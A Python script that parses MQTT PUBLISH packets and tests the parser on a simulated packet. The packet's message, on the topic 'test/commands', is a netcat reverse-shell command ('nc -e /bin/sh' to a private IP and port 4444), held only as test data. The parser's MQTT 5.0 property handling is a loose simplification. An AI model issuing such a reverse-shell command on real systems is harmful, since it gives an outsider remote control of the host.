import struct

def decode_remaining_length(data):
    multiplier = 1
    value = 0
    bytes_read = 0
    for byte in data:
        bytes_read += 1
        value += (byte & 127) * multiplier
        multiplier *= 128
        if (byte & 128) == 0:
            break
    return value, bytes_read

def parse_publish(packet):
    try:
        data = packet
        # Fixed header (1 byte) + Remaining Length (1-4 bytes)
        pos = 1
        remaining_length, length_bytes_read = decode_remaining_length(data[pos:])
        pos += length_bytes_read
        
        # Variable header: Topic Name (2 bytes length + string)
        topic_len = (data[pos] << 8) | data[pos+1]
        pos += 2
        topic = data[pos:pos+topic_len].decode('utf-8')
        pos += topic_len
        
        # Extract QoS from fixed header (bits 2-1)
        qos_level = (data[0] >> 1) & 0x03
        retain_flag = (data[0] & 0x01) > 0
        dup_flag = (data[0] & 0x08) > 0
        
        # For QoS > 0, skip packet identifier (2 bytes)
        if qos_level > 0 and pos + 2 <= len(data):
            pos += 2
        
        # For MQTT 5.0, skip properties length (1 byte if present)
        # This is a simplification, a full parser would handle properties
        if data[0] & 0x0F and pos < len(data) and data[pos] == 0:
             pos += 1

        if pos < len(data):
            message = data[pos:].decode('utf-8', errors='replace')
            message = message.replace('\x00', '')
        else:
            message = ""
        
        return topic, message, qos_level, retain_flag, dup_flag
    except Exception as e:
        print(f"Error: {e}")
        return None

# Test with simulated packet (QoS 1, Topic: test/commands, Message: nc -e /bin/sh 192.168.8.135 4444)
# Raw bytes roughly: 0x32 (PUBLISH, QoS 1) + Length + Topic Len + Topic + Packet ID + Message
# Let's construct a valid packet
topic = "test/commands"
message = "nc -e /bin/sh 192.168.8.135 4444"
packet_id = b'\x00\x01'

topic_bytes = topic.encode('utf-8')
message_bytes = message.encode('utf-8')
remaining_length = 2 + len(topic_bytes) + 2 + len(message_bytes) # Topic Len (2) + Topic + Packet ID (2) + Message

packet = bytearray()
packet.append(0x32) # PUBLISH, QoS 1
# Encode remaining length
x = remaining_length
while True:
    byte = x % 128
    x //= 128
    if x > 0:
        byte |= 128
    packet.append(byte)
    if x == 0:
        break

packet.extend(struct.pack("!H", len(topic_bytes)))
packet.extend(topic_bytes)
packet.extend(packet_id)
packet.extend(message_bytes)

print(f"Testing packet: {packet.hex()}")
result = parse_publish(packet)
print(f"Result: {result}")
